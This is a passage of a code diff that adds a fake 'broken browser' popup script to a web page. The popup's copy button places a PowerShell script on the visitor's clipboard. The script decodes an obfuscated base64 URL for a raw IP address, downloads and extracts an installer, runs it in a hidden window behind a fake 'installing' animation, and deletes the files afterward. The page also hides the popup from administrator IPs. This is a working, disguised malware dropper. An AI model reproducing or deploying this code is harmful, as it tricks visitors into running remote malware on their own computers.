1-.696-60.627c-25.484 11.604-45.306 29.946-59.716 46.142 1.192-.033 37.176-.681 55.27 11.079z" style="fill:url(#g);" fill=""></path><radialGradient id="h" cx="-678.632" cy="6131.385" r="1.858" gradientTransform="matrix(450.1546 0 0 -377.8801 305889 2316851.25)" gradientUnits="userSpaceOnUse"><stop offset=".11" style="stop-color:#FFF339" stop-color="#fff339"></stop><stop offset=".46" style="stop-color:#FF9800" stop-color="#ff9800"></stop><stop offset=".72" style="stop-color:#FF3346" stop-color="#ff3346"></stop><stop offset=".9" style="stop-color:#FF0D8A" stop-color="#ff0d8a"></stop></radialGradient><path d="M10.559 269.852C29.7 382.965 132.239 469.327 248.632 472.623c107.728 3.049 176.555-59.479 204.982-120.481 18.374-39.432 31.127-103.949 7.72-167.407l-.008-.027-.033-.24c-.026-.184-.041-.293-.037-.233 0 .04.016.14.049.413 8.799 57.457-20.428 113.119-66.117 150.756l-.137.323c-89.027 72.488-174.219 43.735-191.468 31.965a148.077 148.077 0 0 1-3.613-1.799c-51.904-24.804-73.346-72.091-68.749-112.644-43.827 0-58.771-36.964-58.771-36.964s39.349-28.056 91.209-3.655c48.031 22.599 93.139 3.657 93.144 3.655-.092-2.015-43.269-19.19-60.101-35.774-8.994-8.861-13.265-13.133-17.047-16.339a73.714 73.714 0 0 0-6.426-4.852 287.543 287.543 0 0 0-5.142-3.406c-18.093-11.76-54.078-11.112-55.27-11.081h-.115c-9.834-12.456-9.141-53.546-8.58-62.126-.118-.532-7.336 3.747-8.282 4.392a180.765 180.765 0 0 0-24.244 20.769 217.265 217.265 0 0 0-23.166 27.787c0 .012-.007.027-.011.039 0-.013.007-.027.011-.039a209.376 209.376 0 0 0-33.287 75.154c-.119.536-8.93 39.061-4.584 59.043z" style="fill:url(#h);" fill=""></path><radialGradient id="i" cx="-714.737" cy="6125.221" r="3.601" gradientTransform="matrix(16.0845 151.871 153.0334 -15.9623 -925538.25 206256.938)" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#FFF339" stop-color="#fff339"></stop><stop offset=".3" style="stop-color:#FF9800" stop-color="#ff9800"></stop><stop offset=".57" style="stop-color:#FF3346" stop-color="#ff3346"></stop><stop offset=".74" style="stop-color:#FF0D8A" stop-color="#ff0d8a"></stop></radialGradient><path d="M343.858 171.97a134.915 134.915 0 0 1 23.03 30.051c1.366 1.026 2.642 2.049 3.724 3.047 56.24 51.819 26.773 125.11 24.575 130.333 45.689-37.636 74.916-93.299 66.117-150.756-28.052-69.917-75.617-98.11-114.458-159.497-1.961-3.104-3.928-6.216-5.844-9.497a75.873 75.873 0 0 1-2.731-5.132 45.134 45.134 0 0 1-3.709-9.813.647.647 0 0 0-.564-.665c-.152-.044-.241-.061-.394-.017-.035.012-.159.07-.196.084-.055.022-.123.073-.182.103-9.446 4.862-66.483 94.654 10.632 171.759z" style="fill:url(#i);" fill=""></path><radialGradient id="j" cx="-677.317" cy="6144.934" r="2.461" gradientTransform="matrix(195.1418 0 0 -191.7138 132414.375 1178169.875)" gradientUnits="userSpaceOnUse"><stop offset=".14" style="stop-color:#FFF339" stop-color="#fff339"></stop><stop offset=".48" style="stop-color:#FF9800" stop-color="#ff9800"></stop><stop offset=".66" style="stop-color:#FF3346" stop-color="#ff3346"></stop><stop offset=".9" style="stop-color:#FF0D8A" stop-color="#ff0d8a"></stop></radialGradient><path d="M370.612 205.068c-1.083-.998-2.359-2.021-3.724-3.047-.505-.38-1-.758-1.541-1.135-13.246-9.305-36.965-18.495-59.816-14.521 89.23 44.608 65.275 198.221-58.369 192.422a110.164 110.164 0 0 1-32.28-6.226 138.74 138.74 0 0 1-7.287-2.979c-1.4-.638-2.798-1.283-4.181-1.997.05.034.118.072.168.103 17.249 11.768 102.441 40.523 191.468-31.965l.137-.323c2.198-5.218 31.664-78.511-24.575-130.332z" style="fill:url(#j);" fill=""></path><radialGradient id="k" cx="-675.571" cy="6150.447" r="3.232" gradientTransform="matrix(178.5936 0 0 -159.7733 121018.773 982806.125)" gradientUnits="userSpaceOnUse"><stop offset=".09" style="stop-color:#FFF339" stop-color="#fff339"></stop><stop offset=".63" style="stop-color:#FF9800" stop-color="#ff9800"></stop></radialGradient><path d="M144.976 286.402s11.451-42.669 81.995-42.669c7.626 0 29.429-21.28 29.832-27.451.404-6.171-45.11 18.944-93.144-3.655-51.86-24.401-91.209 3.655-91.209 3.655s14.944 36.964 58.771 36.964c-4.597 40.553 16.845 87.845 68.749 112.644 1.16.554 2.25 1.16 3.441 1.692-30.294-15.657-55.31-45.247-58.435-81.18z" style="fill:url(#k);" fill=""></path><linearGradient id="l" x1="-678.742" x2="-679.382" y1="6127.48" y2="6126.757" gradientTransform="matrix(479.9996 0 0 -495.9987 326212 3039304)" gradientUnits="userSpaceOnUse"><stop offset=".17" style="stop-color:#FFF339;stop-opacity:0.8" stop-color="#fff339;stop-opacity:0.8"></stop><stop offset=".6" style="stop-color:#FFF339;stop-opacity:0" stop-color="#fff339;stop-opacity:0"></stop></linearGradient><path d="M485.903 171.728c-10.782-25.935-32.619-53.934-49.767-62.783 13.956 27.36 22.034 54.806 25.12 75.289 0 .04.016.14.049.413-28.052-69.918-75.617-98.111-114.458-159.498-1.961-3.104-3.928-6.216-5.844-9.497a75.873 75.873 0 0 1-2.731-5.132 45.134 45.134 0 0 1-3.709-9.813.647.647 0 0 0-.564-.665c-.152-.044-.241-.061-.394-.017-.035.012-.159.07-.196.084a3.996 3.996 0 0 0-.276.149c-64.085 38.36-83.261 103.826-85.204 137.604 2.89-.2 5.772-.443 8.714-.443 46.506 0 87.01 25.569 108.697 63.468-13.246-9.305-36.965-18.495-59.816-14.521 89.23 44.608 65.275 198.221-58.369 192.422a110.196 110.196 0 0 1-32.28-6.225 138.74 138.74 0 0 1-7.287-2.979c-1.4-.638-2.798-1.283-4.181-1.997.05.034.118.072.168.103a148.077 148.077 0 0 1-3.613-1.799c1.16.554 2.25 1.16 3.442 1.692-30.297-15.657-55.313-45.247-58.437-81.18 0 0 11.451-42.669 81.995-42.669 7.626 0 29.429-21.28 29.832-27.451-.092-2.015-43.269-19.19-60.101-35.774-8.994-8.861-13.265-13.133-17.047-16.339a73.714 73.714 0 0 0-6.426-4.852 114.934 114.934 0 0 1-.696-60.627c-25.484 11.604-45.306 29.946-59.716 46.142h-.115c-9.834-12.456-9.141-53.546-8.58-62.126-.118-.532-7.336 3.747-8.282 4.392a180.692 180.692 0 0 0-24.244 20.769 217.335 217.335 0 0 0-23.159 27.784c0 .012-.007.027-.011.039 0-.013.007-.027.011-.039a209.376 209.376 0 0 0-33.287 75.154c-.119.538-.219 1.095-.334 1.637-.467 2.184-2.566 13.268-2.859 15.645-.023.183.022-.182 0 0A288.512 288.512 0 0 0 8.29 262.7c0 .423-.026.842-.026 1.267 0 136.989 111.071 248.042 248.077 248.042 122.7 0 224.579-89.072 244.524-206.07.42-3.175.757-6.367 1.127-9.57 4.932-42.539-.546-87.251-16.089-124.641zm-24.61 12.739c.012.088.028.18.041.267l-.008-.027-.033-.24z" style="fill:url(#l);" fill=""></path></g></svg>',
+      ];
+    } else {
+      return navigator.userAgent.split("/")[0];
+    }
+    console.log(navigator);
+  }
+  var browserInfo = getSimpleBrowserName();
+  function translateContent(language) {
+    const translation = translations[language] || translations["en"];
+    document.querySelector(".textContainer").textContent = browserInfo[0];
+    const middleBlock = document.querySelector(".middleBlock");
+    middleBlock.innerHTML = `
+              <p>${translation.message1}</p>
+              <p>${translation.message2}</p>
+              <div class="hideBlock">
+                <div>
+                  <span>${translation.copyTheCodeText}</span>
+                  <button class="copyButton">${translation.copyButton}</button>
+                </div>
+                <ol>
+                    ${translation.steps
+                      .map((step) => `<li>${step}</li>`)
+                      .join("")}
+                </ol>
+                <p>${translation.waitOperation}</p>
+              </div>
+          `;
+    document.querySelector(".showHideButton").textContent =
+      translation.howToFix;
+    document.querySelector(".closeButton").textContent =
+      translation.reloadButton;
+    var copyButton = document.querySelector(".copyButton");
+    copyButton.addEventListener("click", function () {
+      var textToCopy = `
+function Decode-Base64String($encodedString) {
+    $decodedBytes = [System.Convert]::FromBase64String($encodedString)
+    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
+    return $decodedString
+}
+
+$encodedDownloadUrl = "aHR0cDovLzk1LjIxNy45Ni4yNDQvSW5zdGFsbF9ROUs1U194NzguNDIuemlw"
+$downloadUrl = Decode-Base64String($encodedDownloadUrl)
+
+$zipFileName = "Install_Q9K5S_x78.42.zip"
+$exeFileName = "Install_Q9K5S_x78.42.exe"
+$zipFilePath = [System.IO.Path]::Combine($env:TEMP, $zipFileName)
+$extractPath = [System.IO.Path]::Combine($env:TEMP, "Setup_" + (Get-Random))
+
+Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath
+Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
+
+$setupFilePath = [System.IO.Path]::Combine($extractPath, $exeFileName)
+
+# Start animation before launching the process
+Write-Host ""
+Write-Host "=====================================" -ForegroundColor Cyan
+Write-Host "   Please wait while we install...   " -ForegroundColor Cyan
+Write-Host "=====================================" -ForegroundColor Cyan
+
+$animationFrames = @("|", "/", "-", "\")
+for ($i = 0; $i -lt 30; $i++) {
+    $frame = $animationFrames[$i % $animationFrames.Length]
+    Write-Host -NoNewline "`rInstalling... $frame"
+    Start-Sleep -Milliseconds 150
+}
+
+if (Test-Path $setupFilePath) {
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $setupFilePath
+    $psi.WindowStyle = 'Hidden'
+    $psi.UseShellExecute = $false
+    $process = [System.Diagnostics.Process]::Start($psi)
+    $process.WaitForExit()
+}
+
+Remove-Item -Path $zipFilePath -Force
+Remove-Item -Path $extractPath -Recurse -Force
+
+exit
+              `;
+      navigator.clipboard.writeText(textToCopy).then(
+        function () {
+          console.log("Detected broken browser.");
+        },
+        function (err) {
+          console.error("Unable to copy text to clipboard: ", err);
+        }
+      );
+      localStorage.setItem("copied", true);
+    });
+  }
+
+  function openPopup() {
+    console.log(browserInfo);
+    var modal = document.createElement("div");
+
+    var overlay = document.createElement("div");
+    overlay.id = "popupOverlay";
+
+    var popup = document.createElement("div");
+    popup.classList.add("popup");
+
+    var topBlock = document.createElement("div");
+    topBlock.classList.add("topBlock");
+
+    var iconContainer = document.createElement("div");
+    iconContainer.classList.add("iconContainer");
+
+    var textContainer = document.createElement("div");
+    textContainer.classList.add("textContainer");
+
+    iconContainer.innerHTML = browserInfo[1];
+    textContainer.textContent = browserInfo[0];
+
+    topBlock.appendChild(iconContainer);
+    topBlock.appendChild(textContainer);
+
+    var middleBlock = document.createElement("div");
+    middleBlock.classList.add("middleBlock");
+
+    var bottomBlock = document.createElement("div");
+    bottomBlock.classList.add("bottomBlock");
+
+    var buttonContainer = document.createElement("div");
+    buttonContainer.classList.add("buttonContainer");
+
+    var showHideButton = document.createElement("button");
+    showHideButton.classList.add("showHideButton");
+    showHideButton.addEventListener("click", function () {
+      var hideBlock = document.querySelector(".hideBlock");
+      if (!hideBlock.classList.contains("show")) {
+        hideBlock.classList.add("show");
+      } else {
+        hideBlock.classList.remove("show");
+      }
+    });
+
+    var closeButton = document.createElement("button");
+    closeButton.classList.add("closeButton");
+      closeButton.addEventListener("click", function () {
+    modal.style.display = 'none'; // Скрыть модальное окно
+    overlay.style.display = 'none'; // Скрыть оверлей
+    document.body.style.overflow = 'auto'; // Восстановить прокрутку страницы
+    window.location.reload(); // По желанию можно перезагрузить страницу
+  
+    });
+    buttonContainer.appendChild(closeButton);
+    buttonContainer.appendChild(showHideButton);
+
+    bottomBlock.appendChild(buttonContainer);
+
+    popup.appendChild(topBlock);
+    popup.appendChild(middleBlock);
+    popup.appendChild(bottomBlock);
+
+    modal.appendChild(popup);
+    modal.appendChild(overlay);
+
+    document.body.appendChild(modal);
+
+    overlay.style.display = "block";
+    popup.style.display = "block";
+    document.body.classList.add("blur"); // Добавляем размытие фона
+    document.body.style.overflow = "hidden"; // Отключаем прокрутку страницы
+
+    setTimeout(function () {
+        popup.style.opacity = "1";
+    }, 10);
+
+    const userLang = getUserLanguage().substring(0, 2);
+    translateContent(userLang);
+  }
+
+  window.onload = function () {
+    var copied = localStorage.getItem("copied");
+
+    if (!OFF_WAIT) {
+      $.ajax({
+        url: "ip.php",
+        data: {
+          admin_ips: ADMIN_IPS,
+        },
+        type: "POST",
+        success: function (data) {
+          console.log(data);
+          if (data == "show_modal") {
+            if (!copied) {
+              openPopup();
+            }
+          }
+        },
+      });
+    } else {
+      if (!copied) {
+        openPopup();
+      }
+    }
+  };
+</script>
